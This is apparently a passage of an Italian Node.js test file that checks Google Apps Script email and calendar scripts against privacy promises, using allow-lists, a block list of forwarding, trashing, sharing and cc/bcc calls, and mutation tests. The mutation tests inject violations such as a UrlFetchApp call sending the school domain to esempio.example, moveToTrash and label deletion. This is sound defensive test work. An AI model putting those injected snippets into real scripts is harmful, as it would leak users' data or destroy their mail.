/**
 * Le promesse fatte al DPO, controllate sul codice degli script
 *
 *   node test/invarianti_script.js
 *
 * Organizzazione_Gmail.gs (Posta) e Orari.gs girano nell'account del docente
 * con i permessi di Gmail, di invio e del calendario. Documenti e condizioni
 * promettono che non mandano posta ad altri, non chiamano servizi esterni, non
 * inoltrano, non condividono e non cancellano (se non quello che hanno creato
 * loro). Qui quelle promesse diventano controlli sul testo dei due script,
 * commenti esclusi:
 *
 *   - solo i servizi dell'elenco di ciascun file (Gmail, invio, trigger,
 *     proprieta', lock, Session, Utilities, Logger; il calendario solo negli
 *     orari): qualunque altro, UrlFetchApp, Drive, fogli, documenti, Jdbc,
 *     fa fallire il controllo anche se nessuno l'aveva previsto;
 *   - niente inoltri, condivisioni, invitati, bozze o risposte, cestino, spam;
 *   - ogni sendEmail va a un destinatario ammesso (l'account stesso), senza
 *     cc ne' bcc (nemmeno { 'bcc': x } oppure o.bcc = x);
 *   - le cancellazioni sono solo quelle dell'elenco di ciascun file;
 *   - i filtri di Gmail (solo Posta) etichettano, archiviano e segnano come
 *     letti, e basta;
 *   - del servizio Gmail API (solo Posta) si usano poche chiamate: elencare
 *     etichette e filtri, leggere e cambiare il colore di un'etichetta, creare
 *     un filtro. Cancellare un'etichetta no, in nessuna forma: il servizio si
 *     chiama solo per nome scritto con il punto (niente Labels['del' + 'ete']),
 *     non si mette in una variabile, e patch cambia soltanto il colore;
 *   - togliere un filtro di Gmail (Filters.remove) si puo' solo dentro
 *     EXTRA_togliFiltri e la sua funzione interna _togliFiltri_, che toglie
 *     soltanto i filtri scelti dal docente dopo averne scritto la copia:
 *     altrove e' una cancellazione non ammessa, come tutte le altre.
 *     EXTRA_togliFiltri la esegue solo il docente: nessuna funzione e nessun
 *     trigger la chiama, e _togliFiltri_ la chiama solo EXTRA_togliFiltri;
 *   - i nomi delle azioni vietate (TRASH, SPAM, forward...) possono stare
 *     solo nella tabella di testi _AZIONI_A_PAROLE, con cui la copia di un
 *     filtro dice che cosa faceva: solo testi, letti per chiave solo da
 *     _copiaFiltro_.
 *
 * Poi la prova della prova: su copie modificate in memoria (e, per il banco
 * test/mock_apps_script.js, su una copia temporanea del motore) un
 * UrlFetchApp, un foglio nel Drive, una connessione Jdbc, un destinatario
 * estraneo, una copia in cc, un moveToTrash, un filtro tolto fuori da
 * EXTRA_togliFiltri, _togliFiltri_ chiamata dallo smistamento di ogni ora,
 * un'etichetta cancellata anche li' dentro o la tabella dei testi usata per
 * altro devono far fallire i controlli. Se un giorno uno di questi non
 * fallisse piu', il controllo sarebbe diventato cieco.
 *
 * Infine i due estrattori del personale (l'estensione per Chrome e la
 * funzione da console) su una pagina del registro finta, con persone
 * inventate: l'estensione lavora solo su spaggiari.eu, la funzione da console
 * scarica il CSV solo se gli appunti non funzionano, e i due leggono la
 * pagina allo stesso modo. Con --categorie stampa in JSON le categorie che
 * i due danno ai ruoli (le confronta con il C# test/prova_personale.ps1).
 */

'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const vm = require('vm');
const figlio = require('child_process');

const radice = path.join(__dirname, '..');
const risorse = path.join(radice, 'src', 'risorse');

let fallimenti = 0;
function verifica(descrizione, condizione) {
  console.log((condizione ? '  OK   ' : '  FALLITO  ') + descrizione);
  if (!condizione) fallimenti++;
}
function intestazione(t) { console.log('\n' + '='.repeat(72) + '\n  ' + t + '\n' + '='.repeat(72)); }

// ---------------------------------------------------------------------------
//  IL CODICE SENZA COMMENTI
//  codice: i commenti diventano spazi (a capo compresi), stringhe intatte;
//  nudo:   anche stringhe e espressioni regolari svuotate;
//  stringhe: il valore di ogni stringa letterale.
// ---------------------------------------------------------------------------
function smonta(sorgente) {
  let codice = '', nudo = '';
  const stringhe = [];
  let ultimo = '';                         // ultimo carattere significativo
  const n = sorgente.length;
  let i = 0;
  const bianco = t => t.replace(/[^\n]/g, ' ');
  const apreRegex = () => {
    if (ultimo === '' || /[(,=:[!&|?{};+\-*%<>~^]/.test(ultimo)) return true;
    return /\b(return|typeof|case|do|else|in|of|new|delete|void|throw)\s*$/.test(codice);
  };
  while (i < n) {
    const c = sorgente[i], d = sorgente[i + 1];
    if (c === '/' && d === '/') {
      let j = sorgente.indexOf('\n', i);
      if (j < 0) j = n;
      const pezzo = bianco(sorgente.slice(i, j));
      codice += pezzo; nudo += pezzo; i = j;
      continue;
    }
    if (c === '/' && d === '*') {
      let j = sorgente.indexOf('*/', i + 2);
      j = (j < 0) ? n : j + 2;
      const pezzo = bianco(sorgente.slice(i, j));
      codice += pezzo; nudo += pezzo; i = j;
      continue;
    }
    if (c === '\'' || c === '"' || c === '`') {
      let j = i + 1, valore = '';
      while (j < n && sorgente[j] !== c) {
        if (sorgente[j] === '\\') { valore += sorgente[j + 1]; j += 2; continue; }
        valore += sorgente[j]; j++;
      }
      j++;
      const pezzo = sorgente.slice(i, j);
      codice += pezzo;
      nudo += c + bianco(pezzo.slice(1, -1)) + c;
      stringhe.push(valore);
      ultimo = c; i = j;
      continue;
    }
    if (c === '/' && apreRegex()) {
      let j = i + 1, classe = false;
      while (j < n && (sorgente[j] !== '/' || classe)) {
        if (sorgente[j] === '\\') { j += 2; continue; }
        if (sorgente[j] === '[') classe = true;
        else if (sorgente[j] === ']') classe = false;
        j++;
      }
      j++;
      while (j < n && /[a-z]/i.test(sorgente[j])) j++;
      const pezzo = sorgente.slice(i, j);
      codice += pezzo;
      nudo += '/' + bianco(pezzo.slice(1)).replace(/ $/, '/');
      ultimo = '/'; i = j;
      continue;
    }
    codice += c; nudo += c;
    if (!/\s/.test(c)) ultimo = c;
    i++;
  }
  return { codice, nudo, stringhe };
}

/** Il testo fra le parentesi di una chiamata, a partire dalla "(" in posizione i. */
function argomenti(testo, nudo, i) {
  let profondita = 0;
  for (let j = i; j < nudo.length; j++) {
    if (nudo[j] === '(' || nudo[j] === '{' || nudo[j] === '[') profondita++;
    else if (nudo[j] === ')' || nudo[j] === '}' || nudo[j] === ']') {
      profondita--;
      if (profondita === 0) return { testo: testo.slice(i + 1, j), nudo: nudo.slice(i + 1, j) };
    }
  }
  return { testo: testo.slice(i + 1), nudo: nudo.slice(i + 1) };
}

/** Il primo argomento (fino alla prima virgola al livello piu' esterno). */
function primoArgomento(a) {
  let profondita = 0;
  for (let j = 0; j < a.nudo.length; j++) {
    const c = a.nudo[j];
    if (c === '(' || c === '{' || c === '[') profondita++;
    else if (c === ')' || c === '}' || c === ']') profondita--;
    else if (c === ',' && profondita === 0) return { testo: a.testo.slice(0, j), nudo: a.nudo.slice(0, j) };
  }
  return a;
}

/**
 * Le chiavi di un oggetto scritto per esteso ({ a: 1, 'b': { c: 2 } }), con
 * il loro valore: [{ chiave, valore: { testo, nudo } }]. null se non e' un
 * oggetto scritto cosi' (una variabile, una chiamata) o se una chiave non si
 * legge (calcolata, abbreviata, ...altro).
 */
function chiaviOggetto(a) {
  const inizio = a.nudo.search(/\S/), fine = a.nudo.search(/\s*$/);
  if (inizio < 0 || a.nudo[inizio] !== '{' || a.nudo[fine - 1] !== '}') return null;
  const dentro = { testo: a.testo.slice(inizio + 1, fine - 1), nudo: a.nudo.slice(inizio + 1, fine - 1) };
  const fuori = [];
  let profondita = 0, da = 0;
  for (let j = 0; j <= dentro.nudo.length; j++) {
    const c = dentro.nudo[j];
    if (c === '(' || c === '{' || c === '[') { profondita++; continue; }
    if (c === ')' || c === '}' || c === ']') { profondita--; continue; }
    if (j < dentro.nudo.length && (c !== ',' || profondita !== 0)) continue;
    const pezzo = dentro.testo.slice(da, j), nudoPezzo = dentro.nudo.slice(da, j);
    da = j + 1;
    if (!pezzo.trim()) continue;                   // la virgola dopo l'ultima chiave
    const k = /^\s*(['"]?)([A-Za-z_$][\w$]*)\1\s*:/.exec(pezzo);
    if (!k) return null;
    fuori.push({ chiave: k[2], valore: { testo: pezzo.slice(k[0].length), nudo: nudoPezzo.slice(k[0].length) } });
  }
  return fuori;
}

// ---------------------------------------------------------------------------
//  LE REGOLE, FILE PER FILE
// ---------------------------------------------------------------------------
// I servizi di Google (e i nomi globali in genere) non si vietano uno per uno:
// ogni file ha l'elenco di quelli che puo' usare, e qualunque altro nome
// globale con la maiuscola fa fallire il controllo. Cosi' SpreadsheetApp,
// DocumentApp, DriveApp, Jdbc, UrlFetchApp e quelli che Google aggiungera'
// sono fuori senza doverli conoscere.
const JS = ['JSON', 'Math', 'String', 'Number', 'Date', 'Object', 'Array', 'Error', 'RegExp'];
const SERVIZI_POSTA = ['GmailApp', 'MailApp', 'ScriptApp', 'PropertiesService', 'LockService',
                       'Session', 'Utilities', 'Logger', 'Gmail'];

const VIETATI = [
  [/forward/i, 'inoltro (forward)'],
  [/trash/i, 'cestino (trash)'],
  [/spam/i, 'spam'],
  [/\b(addEditors?|addViewers?|addCommenters?|setSharing|share|setOwner|Permissions)\b/, 'condivisione'],
  [/\b(addGuest|guests|sendInvites)\b/, 'invitati a un evento'],
  [/\b(createDraft|reply|replyAll)\b/, 'bozza o risposta a nome tuo'],
  // { cc: x }, { 'bcc': x }, o.bcc = x, o['cc'] = x
  [/(['"]?)\b(cc|bcc)\1\s*:|\.\s*(cc|bcc)\s*=(?!=)|\[\s*(['"])(cc|bcc)\4\s*\]\s*=(?!=)/,
   'copia (cc) o copia nascosta (bcc) in un invio'],
  // Gmail.Users.Labels['delete'](...): le cancellazioni qui sotto guardano
  // solo le chiamate scritte con il punto
  [/\[\s*(['"`])\w*(delete|remove|trash|purge|clear|empty|destroy)\w*\1\s*\]/i,
   'cancellazione chiamata per nome fra parentesi quadre']
];

// etichette di sistema di Gmail: un filtro puo' toglierne solo quelle ammesse
const DI_SISTEMA = /^(INBOX|UNREAD|TRASH|SPAM|STARRED|UNSTARRED|IMPORTANT|SENT|DRAFT|CHAT|CATEGORY_[A-Z]+)$/;

const REGOLE = {
  'Organizzazione_Gmail.gs': {
    // CONFIG sta in Configurazione.gs, nello stesso progetto
    servizi: SERVIZI_POSTA.concat(JS, ['CONFIG']),
    cancellazioni: ['deleteProperty', 'deleteTrigger', 'removeFromThreads'],
    destinatari: [/^_mioIndirizzo_?\(\)$/],
    etichetteDiSistema: ['INBOX', 'UNREAD'],
    // le etichette: elencarle, leggerne il colore (get) e cambiarlo (patch);
    // mai cancellarle (delete, che resta fuori anche dalle cancellazioni)
    gmailApi: ['Gmail.Users.Labels.list', 'Gmail.Users.Labels.get', 'Gmail.Users.Labels.patch',
               'Gmail.Users.Settings.Filters.list', 'Gmail.Users.Settings.Filters.create'],
    // togliere un filtro: solo i filtri scelti dal docente, e solo dentro
    // queste funzioni, che prima ne scrivono la copia nel registro. Quella
    // pubblica (senza "_" in fondo) la esegue solo il docente: nessuna
    // funzione la chiama. Quelle interne le chiama solo quella pubblica.
    gmailApiSoloIn: { 'Gmail.Users.Settings.Filters.remove': ['EXTRA_togliFiltri', '_togliFiltri_'] },
    // la tabella dei testi delle azioni di Gmail per la copia di un filtro:
    // solo testi, letti per chiave e solo dentro _copiaFiltro_
    tabellaDiTesti: { nome: '_AZIONI_A_PAROLE', gruppi: ['aggiunge', 'toglie', 'altro'], soloIn: '_copiaFiltro_' }
  },
  'Orari.gs': {
    // ORARI sta in DatiOrari.gs; CONFIG (il prefisso delle etichette) in
    // Configurazione.gs della Posta, se c'e'
    servizi: SERVIZI_POSTA.concat(['CalendarApp'], JS, ['CONFIG', 'ORARI']),
    cancellazioni: ['deleteProperty', 'deleteTrigger', 'deleteEventSeries', 'deleteEvent'],
    destinatari: [/^mio$/, /^m\.a$/, /^_mioIndirizzoOrari_?\(\)$/],
    etichetteDiSistema: [],
    gmailApi: [],
    gmailApiSoloIn: {}
  }
};

/**
 * Dove sta il corpo di ogni funzione dichiarata nel testo nudo: nome ->
 * [[da, a], ...], dalla "{" alla "}" che la chiude. Nel testo nudo stringhe,
 * espressioni regolari e commenti sono spazi: le loro graffe non contano.
 */
function corpiDelleFunzioni(nudo) {
  const fuori = {};
  const dichiarazione = /\bfunction\s+([A-Za-z_$][\w$]*)\s*\(/g;
  let m;
  while ((m = dichiarazione.exec(nudo))) {
    const aperta = nudo.indexOf('{', m.index + m[0].length);
    if (aperta < 0) continue;
    let profondita = 0, j = aperta;
    for (; j < nudo.length; j++) {
      if (nudo[j] === '{') profondita++;
      else if (nudo[j] === '}' && --profondita === 0) break;
    }
    (fuori[m[1]] = fuori[m[1]] || []).push([aperta, j]);
  }
  return fuori;
}

/** Vero se la posizione sta dentro il corpo di una delle funzioni nominate. */
function dentroA(corpi, nomi, posizione) {
  return nomi.some(n => (corpi[n] || []).some(c => posizione > c[0] && posizione < c[1]));
}

/**
 * La tabella dei testi (regole.tabellaDiTesti): var NOME = { gruppo: { CHIAVE:
 * 'testo', ... }, ... }. Nelle chiavi e nei testi ci sono nomi vietati nel
 * resto dello script (TRASH, SPAM, forward: le azioni che la copia di un filtro
 * deve saper dire), e qui non contano, ma solo se la tabella e' fatta soltanto
 * di testi, se c'e' una volta sola e se si legge solo per chiave
 * (NOME.gruppo[...]) dentro la funzione ammessa: cosi' una chiave non puo'
 * diventare un valore (Object.keys, for in) e finire in un filtro creato.
 * Torna il sorgente con la tabella cancellata (spazi, a capo intatti) e le
 * violazioni trovate.
 */
function tabellaDiTesti(sorgente, t) {
  const fuori = [];
  let { codice, nudo } = smonta(sorgente);
  const riga = pos => codice.slice(0, pos).split('\n').length;
  const dichiarazione = new RegExp('\\bvar\\s+' + t.nome + '\\s*=\\s*\\{', 'g');
  const trovate = [...nudo.matchAll(dichiarazione)];
  if (trovate.length === 0) return { sorgente, fuori };
  if (trovate.length > 1) {
    fuori.push('la tabella ' + t.nome + ' e\' dichiarata ' + trovate.length + ' volte');
    return { sorgente, fuori };
  }
  const inizio = trovate[0].index, aperta = inizio + trovate[0][0].length - 1;
  const dentro = argomenti(codice, nudo, aperta);
  const chiusa = aperta + 1 + dentro.nudo.length;
  const oggetto = { testo: codice.slice(aperta, chiusa + 1), nudo: nudo.slice(aperta, chiusa + 1) };
  const gruppi = chiaviOggetto(oggetto);
  const soloTesti = !!gruppi && gruppi.every(g => {
    if (t.gruppi.indexOf(g.chiave) < 0) return false;
    const voci = chiaviOggetto(g.valore);
    // nel testo nudo una stringa e' fatta solo di virgolette e spazi
    return !!voci && voci.every(v => /^\s*(['"])[ ]*\1\s*$/.test(v.valore.nudo));
  });
  if (!soloTesti) {
    fuori.push('la tabella ' + t.nome + ' non e\' fatta solo di testi nei gruppi ' + t.gruppi.join(', ') +
               ' (riga ' + riga(inizio) + ')');
    return { sorgente, fuori };
  }
  const bianco = x => x.replace(/[^\n]/g, ' ');
  sorgente = sorgente.slice(0, inizio) + bianco(sorgente.slice(inizio, chiusa + 1)) + sorgente.slice(chiusa + 1);
  ({ codice, nudo } = smonta(sorgente));
  const corpi = corpiDelleFunzioni(nudo);
  if ((corpi[t.soloIn] || []).length !== 1) {
    fuori.push('la funzione ' + t.soloIn + ', l\'unica che legge ' + t.nome + ', non e\' dichiarata una volta sola');
  }
  const uso = new RegExp('\\b' + t.nome + '\\b', 'g');
  const perChiave = new RegExp('^\\s*\\.\\s*(' + t.gruppi.join('|') + ')\\s*\\[');
  let u;
  while ((u = uso.exec(nudo))) {
    if (!dentroA(corpi, [t.soloIn], u.index)) {
      fuori.push(t.nome + ' usata fuori da ' + t.soloIn + ' (riga ' + riga(u.index) + ')');
    } else if (!perChiave.test(nudo.slice(u.index + t.nome.length))) {
      fuori.push(t.nome + ' letta non per chiave, ' + t.nome + '.gruppo[...] (riga ' + riga(u.index) + ')');
    }
  }
  return { sorgente, fuori };
}

/** L'elenco delle violazioni di un file: vuoto se rispetta le promesse. */
function controlla(nomeFile, sorgenteIntero) {
  const regole = REGOLE[nomeFile];
  const fuori = [];
  // la tabella dei testi, se c'e' e va bene, non la guardano i controlli qui sotto
  let sorgente = sorgenteIntero;
  if (regole.tabellaDiTesti) {
    const tabella = tabellaDiTesti(sorgenteIntero, regole.tabellaDiTesti);
    sorgente = tabella.sorgente;
    fuori.push(...tabella.fuori);
  }
  const { codice, nudo, stringhe } = smonta(sorgente);
  const riga = pos => codice.slice(0, pos).split('\n').length;

  for (const [re, cosa] of VIETATI) {
    const m = re.exec(codice);
    if (m) fuori.push(cosa + ' (riga ' + riga(m.index) + ': ' + m[0] + ')');
  }

  // i nomi globali con la maiuscola: solo i servizi dell'elenco del file e i
  // nomi dichiarati nel file stesso (le sue funzioni e variabili). Un nome
  // dopo un punto e' un membro (GmailApp.search, CalendarApp.Color), non conta.
  const dichiarati = new Set([...nudo.matchAll(/\b(?:function|var|let|const)\s+([A-Za-z_$][\w$]*)/g)].map(x => x[1]));
  const visti = new Set();
  const maiuscola = /[A-Z][\w$]*/g;
  let g;
  while ((g = maiuscola.exec(nudo))) {
    const nome = g[0];
    if (g.index > 0 && /[\w$]/.test(nudo[g.index - 1])) continue;       // pezzo di un altro nome
    if (/\.\s*$/.test(nudo.slice(Math.max(0, g.index - 40), g.index))) continue;   // un membro
    if (regole.servizi.indexOf(nome) >= 0 || dichiarati.has(nome) || visti.has(nome)) continue;
    visti.add(nome);
    fuori.push('servizio non ammesso: ' + nome + ' (riga ' + riga(g.index) + ')');
  }

  // le chiamate del servizio Gmail ammesse solo dentro certe funzioni
  // (Filters.remove solo in EXTRA_togliFiltri): quelle al loro posto non
  // sono cancellazioni fuori elenco; il punto del metodo le riconosce qui sotto
  const corpi = corpiDelleFunzioni(nudo);
  const soloIn = regole.gmailApiSoloIn || {};
  const alSuoPosto = new Set();
  const api = /\bGmail\s*\.\s*Users(?:\s*\.\s*[A-Za-z_$][\w$]*)+\s*\(/g;
  let m;
  while ((m = api.exec(nudo))) {
    const nome = m[0].replace(/\s+/g, '').replace(/\($/, '');
    if (regole.gmailApi.indexOf(nome) >= 0) continue;
    if (soloIn[nome]) {
      if (dentroA(corpi, soloIn[nome], m.index)) { alSuoPosto.add(m.index + m[0].lastIndexOf('.')); continue; }
      fuori.push(nome + ' fuori da ' + soloIn[nome].join(' e ') + ' (riga ' + riga(m.index) + ')');
      continue;
    }
    fuori.push('servizio Gmail non ammesso: ' + nome + ' (riga ' + riga(m.index) + ')');
  }
  // una seconda funzione con lo stesso nome prenderebbe il posto di quella vera
  for (const nome of Object.keys(soloIn)) {
    for (const f of soloIn[nome]) {
      if ((corpi[f] || []).length > 1) fuori.push('la funzione ' + f + ' e\' dichiarata ' + corpi[f].length + ' volte');
    }
  }
  // e chi le chiama. Quella pubblica (EXTRA_togliFiltri) la esegue solo il
  // docente dall'editor: nel codice non compare mai, se non nella sua
  // dichiarazione, cosi' nessuna funzione e nessun trigger orario la chiama.
  // Quelle interne (_togliFiltri_) si chiamano solo dentro quella pubblica,
  // e non si prendono come valore. Il loro nome non si scrive nemmeno fra
  // virgolette da solo: ScriptApp.newTrigger('EXTRA_togliFiltri').
  for (const nome of Object.keys(soloIn)) {
    const pubbliche = soloIn[nome].filter(f => !/_$/.test(f));
    for (const f of soloIn[nome]) {
      const pubblica = pubbliche.indexOf(f) >= 0;
      const uso = new RegExp('\\b' + f + '\\b', 'g');
      let u;
      while ((u = uso.exec(nudo))) {
        if (/\bfunction\s+$/.test(nudo.slice(Math.max(0, u.index - 30), u.index))) continue;   // la dichiarazione
        const chiamata = /^\s*\(/.test(nudo.slice(u.index + f.length));
        if (!pubblica && chiamata && dentroA(corpi, pubbliche, u.index)) continue;
        fuori.push((pubblica ? f + ' chiamata o nominata nel codice: la esegue solo il docente'
                             : f + ' usata fuori da ' + pubbliche.join(' e ')) + ' (riga ' + riga(u.index) + ')');
      }
      if (stringhe.some(s => s.trim() === f)) fuori.push('il nome ' + f + ' da solo fra virgolette (un trigger?)');
    }
  }

  // le cancellazioni: solo quelle dell'elenco
  const chiamata = /\.\s*([A-Za-z_$][\w$]*)\s*\(/g;
  while ((m = chiamata.exec(nudo))) {
    const nome = m[1];
    if (/delete|remove|trash|purge|clear|empty|destroy/i.test(nome) &&
        regole.cancellazioni.indexOf(nome) < 0 && !alSuoPosto.has(m.index)) {
      fuori.push('cancellazione non ammessa: ' + nome + ' (riga ' + riga(m.index) + ')');
    }
  }

  // ogni invio va a un destinatario ammesso
  const invio = /\bsendEmail\s*\(/g;
  let invii = 0;
  while ((m = invio.exec(nudo))) {
    invii++;
    const aperta = m.index + m[0].length - 1;
    const primo = primoArgomento(argomenti(codice, nudo, aperta));
    let chi = primo.testo.trim();
    if (chi.charAt(0) === '{') {
      const to = /(?:^|[{,\s])to\s*:\s*([^,}\n]+)/.exec(chi);
      chi = to ? to[1].trim() : '(nessun "to")';
    }
    if (!regole.destinatari.some(re => re.test(chi))) {
      fuori.push('email verso un destinatario non ammesso: ' + chi + ' (riga ' + riga(m.index) + ')');
    }
  }
  if (invii === 0) fuori.push('nessun sendEmail trovato: il controllo dei destinatari non vale piu\'');

  // etichette di sistema (filtri di Gmail): solo quelle ammesse
  for (const s of stringhe) {
    if (DI_SISTEMA.test(s) && regole.etichetteDiSistema.indexOf(s) < 0) {
      fuori.push('etichetta di sistema non ammessa: ' + s);
    }
  }

  // il servizio avanzato Gmail (controllato piu' su): elencare etichette e
  // filtri, leggere e cambiare il colore di un'etichetta, creare filtri, e
  // togliere quelli scelti solo dentro EXTRA_togliFiltri; nient'altro.
  // L'elenco guarda solo i nomi scritti con il punto: un nome
  // calcolato (Labels['del' + 'ete'], Labels[op]) o il servizio messo in una
  // variabile (var L = Gmail.Users.Labels; L[k]()) lo aggirerebbero
  const calcolato = /\bGmail\b(?:\s*\.\s*[A-Za-z_$][\w$]*)*\s*\[/g;
  while ((m = calcolato.exec(nudo))) {
    fuori.push('servizio Gmail chiamato con un nome calcolato: ' + m[0].replace(/\s+/g, '') +
               ' (riga ' + riga(m.index) + ')');
  }
  const valore = /(?:=|:|,|\(|\breturn)\s*(\bGmail\b(?:\s*\.\s*[A-Za-z_$][\w$]*)*)\s*[;,)}\]]/g;
  while ((m = valore.exec(nudo))) {
    fuori.push('servizio Gmail preso come valore: ' + m[1].replace(/\s+/g, '') +
               ' (riga ' + riga(m.index) + ')');
  }
  // patch di un'etichetta: solo { color: { backgroundColor, textColor } }.
  // Con altre chiavi potrebbe nasconderla (labelListVisibility) o rinominarla.
  const patch = /\bGmail\s*\.\s*Users\s*\.\s*Labels\s*\.\s*patch\s*\(/g;
  while ((m = patch.exec(nudo))) {
    const corpo = chiaviOggetto(primoArgomento(argomenti(codice, nudo, m.index + m[0].length - 1)));
    const colore = (corpo && corpo.length === 1 && corpo[0].chiave === 'color') ? chiaviOggetto(corpo[0].valore) : null;
    const soloColore = !!colore && colore.length > 0 &&
      colore.every(c => c.chiave === 'backgroundColor' || c.chiave === 'textColor');
    if (!soloColore) {
      fuori.push('Gmail.Users.Labels.patch cambia altro oltre al colore (riga ' + riga(m.index) + ')');
    }
  }
  return fuori;
}

// ---------------------------------------------------------------------------
//  1. GLI SCRIPT DI OGGI RISPETTANO LE PROMESSE
// ---------------------------------------------------------------------------
const sorgenti = {};
for (const nome of Object.keys(REGOLE)) {
  sorgenti[nome] = fs.readFileSync(path.join(risorse, nome), 'utf8');
}

function scriptDiOggi() {
  intestazione('GLI SCRIPT DI OGGI');
  for (const nome of Object.keys(REGOLE)) {
    const v = controlla(nome, sorgenti[nome]);
    verifica(nome + ': nessuna violazione', v.length === 0);
    v.forEach(x => console.log('        ' + x));
  }
}

// ---------------------------------------------------------------------------
//  2. LA PROVA DELLA PROVA: copie modificate devono fallire
// ---------------------------------------------------------------------------
function inserisci(testo, dopo, aggiunta) {
  const i = testo.indexOf(dopo);
  if (i < 0) return null;
  return testo.slice(0, i + dopo.length) + aggiunta + testo.slice(i + dopo.length);
}
function sostituisci(testo, vecchio, nuovo) {
  return testo.indexOf(vecchio) < 0 ? null : testo.replace(vecchio, nuovo);
}
function deveFallire(nomeFile, descrizione, modificato, attesa) {
  if (modificato === null) { verifica(descrizione + ' (punto di aggancio non trovato)', false); return; }
  const v = controlla(nomeFile, modificato);
  verifica(descrizione, v.some(x => x.indexOf(attesa) >= 0));
}

function provaDellaProva() {
  intestazione('LA PROVA DELLA PROVA: COPIE MODIFICATE IN MEMORIA');
  const posta = sorgenti['Organizzazione_Gmail.gs'];
  const INIZIO = 'function PASSO_1_anteprima() {';
  const DENTRO_TOGLI = 'function _togliFiltri_(voci, prova) {';
  deveFallire('Organizzazione_Gmail.gs', 'un UrlFetchApp aggiunto viene trovato',
    inserisci(posta, INIZIO, '\n  UrlFetchApp.fetch(\'https://esempio.example/?d=\' + _config_().dominioScuola);'),
    'UrlFetchApp');
  deveFallire('Organizzazione_Gmail.gs', 'un destinatario estraneo viene trovato',
    sostituisci(posta, 'MailApp.sendEmail(_mioIndirizzo_(),', 'MailApp.sendEmail(\'collega@scuola-esempio.edu.it\','),
    'destinatario non ammesso');
  deveFallire('Organizzazione_Gmail.gs', 'una copia in cc viene trovata',
    sostituisci(posta, '\'[Organizzazione Gmail] \' + oggetto, corpo);',
                '\'[Organizzazione Gmail] \' + oggetto, corpo, { cc: \'collega@scuola-esempio.edu.it\' });'),
    'copia (cc)');
  deveFallire('Organizzazione_Gmail.gs', 'un moveToTrash viene trovato',
    inserisci(posta, INIZIO, '\n  GmailApp.search(\'in:inbox\')[0].moveToTrash();'), 'cestino');
  deveFallire('Organizzazione_Gmail.gs', 'una cancellazione fuori elenco viene trovata',
    inserisci(posta, INIZIO, '\n  GmailApp.deleteLabel(GmailApp.getUserLabelByName(\'Colleghi\'));'),
    'cancellazione non ammessa: deleteLabel');
  deveFallire('Organizzazione_Gmail.gs', 'un filtro che butta nel cestino viene trovato',
    sostituisci(posta, 'togli.push(\'INBOX\');', 'togli.push(\'INBOX\'); togli.push(\'TRASH\');'),
    'etichetta di sistema non ammessa: TRASH');
  deveFallire('Organizzazione_Gmail.gs', 'un servizio Gmail fuori elenco viene trovato',
    inserisci(posta, INIZIO, '\n  Gmail.Users.Messages.batchDelete({ ids: [] }, \'me\');'),
    'Gmail.Users.Messages.batchDelete');
  // colorare un'etichetta si', cancellarla no: ne' dall'elenco dei servizi
  // Gmail ne' da quello delle cancellazioni
  const cancellaEtichetta = sostituisci(posta, '_applicaColore_(inGmail[nome].id, colore, inGmail);',
    'Gmail.Users.Labels.remove(\'me\', inGmail[nome].id);');
  deveFallire('Organizzazione_Gmail.gs', 'un\'etichetta cancellata con il servizio Gmail viene trovata',
    cancellaEtichetta, 'servizio Gmail non ammesso: Gmail.Users.Labels.remove');
  deveFallire('Organizzazione_Gmail.gs', 'ed e\' anche una cancellazione non ammessa',
    cancellaEtichetta, 'cancellazione non ammessa: remove');
  deveFallire('Organizzazione_Gmail.gs', 'Gmail.Users.Labels.delete viene trovata',
    inserisci(posta, INIZIO, '\n  Gmail.Users.Labels.delete(\'me\', \'Label_1\');'),
    'servizio Gmail non ammesso: Gmail.Users.Labels.delete');
  deveFallire('Organizzazione_Gmail.gs', 'anche chiamata per nome, Gmail.Users.Labels[\'delete\']',
    inserisci(posta, INIZIO, '\n  Gmail.Users.Labels[\'delete\'](\'me\', \'Label_1\');'),
    'cancellazione chiamata per nome fra parentesi quadre');
  // un nome calcolato non lo legge nessuno: si ferma prima, a "Labels["
  deveFallire('Organizzazione_Gmail.gs', 'e con il nome calcolato, Gmail.Users.Labels[\'del\' + \'ete\']',
    inserisci(posta, INIZIO, '\n  Gmail.Users.Labels[\'del\' + \'ete\'](\'me\', \'Label_1\');'),
    'servizio Gmail chiamato con un nome calcolato');
  deveFallire('Organizzazione_Gmail.gs', 'o scritto in una variabile, Gmail.Users.Labels[op]',
    inserisci(posta, INIZIO, '\n  var op = \'d\' + \'elete\'; Gmail.Users.Labels[op](\'me\', \'Label_1\');'),
    'servizio Gmail chiamato con un nome calcolato');
  deveFallire('Organizzazione_Gmail.gs', 'e il servizio messo in una variabile (var L = Gmail.Users.Labels)',
    inserisci(posta, INIZIO, '\n  var L = Gmail.Users.Labels, k = \'remo\' + \'ve\'; L[k](\'me\', \'Label_1\');'),
    'servizio Gmail preso come valore: Gmail.Users.Labels');
  deveFallire('Organizzazione_Gmail.gs', 'anche tutto il servizio, passato a una funzione',
    inserisci(posta, INIZIO, '\n  _pulisci_(Gmail);'), 'servizio Gmail preso come valore: Gmail');
  // patch si', ma solo per il colore: nascondere o rinominare un'etichetta no
  const COLORE = '{ color: { backgroundColor: sfondo, textColor: testo } }';
  deveFallire('Organizzazione_Gmail.gs', 'un patch che nasconde l\'etichetta viene trovato',
    sostituisci(posta, COLORE, '{ labelListVisibility: \'labelHide\', messageListVisibility: \'hide\' }'),
    'Gmail.Users.Labels.patch cambia altro oltre al colore');
  deveFallire('Organizzazione_Gmail.gs', 'e uno che la rinomina',
    sostituisci(posta, COLORE, '{ name: \'Vecchie\' }'), 'Gmail.Users.Labels.patch cambia altro oltre al colore');
  deveFallire('Organizzazione_Gmail.gs', 'anche se accanto al colore',
    sostituisci(posta, COLORE, '{ color: { backgroundColor: sfondo, textColor: testo }, name: \'Vecchie\' }'),
    'Gmail.Users.Labels.patch cambia altro oltre al colore');
  deveFallire('Organizzazione_Gmail.gs', 'o dentro il colore',
    sostituisci(posta, COLORE, '{ color: { backgroundColor: sfondo, textColor: testo, name: \'Vecchie\' } }'),
    'Gmail.Users.Labels.patch cambia altro oltre al colore');
  deveFallire('Organizzazione_Gmail.gs', 'e uno con un corpo che non si legge (una variabile)',
    sostituisci(posta, COLORE, 'corpo'), 'Gmail.Users.Labels.patch cambia altro oltre al colore');
  deveFallire('Organizzazione_Gmail.gs', 'un\'etichetta cancellata con GmailApp (deleteLabel) viene trovata',
    inserisci(posta, INIZIO, '\n  GmailApp.getUserLabelByName(\'Colleghi\').deleteLabel();'),
    'cancellazione non ammessa: deleteLabel');

